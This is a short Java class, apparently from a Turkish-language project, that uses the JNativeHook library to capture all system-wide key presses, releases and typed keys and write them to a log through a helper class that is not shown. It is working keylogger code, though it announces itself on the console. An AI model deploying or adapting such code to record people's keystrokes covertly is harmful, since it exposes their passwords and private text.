
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyboardLogger implements NativeKeyListener {

    private boolean isListening;
    private dosyayaz veriyaz;

    public KeyboardLogger() throws IOException{
        isListening = false;
        veriyaz = new dosyayaz();
    }

    public void startListening() {
        if (!isListening) {
            try {
                if (!GlobalScreen.isNativeHookRegistered()) {
                    System.out.println(GlobalScreen.isNativeHookRegistered() + "");
                    GlobalScreen.registerNativeHook();
                }
                GlobalScreen.addNativeKeyListener(this);
                isListening = true;
                System.out.println("Klavye dinlemesi başlatıldı.");
            } catch (NativeHookException ex) {
                Logger.getLogger(KeyboardLogger.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }

    public void stopListening() throws NativeHookException {
        if (isListening) {

            GlobalScreen.removeNativeKeyListener(this);
            GlobalScreen.unregisterNativeHook();
            isListening = false;
            System.out.println("Klavye dinlemesi durduruldu.");
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        veriyaz.veriYaz("Tusa basildi: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        veriyaz.veriYaz("Tus birakildi: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        veriyaz.veriYaz("Tus yazildi: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }
}
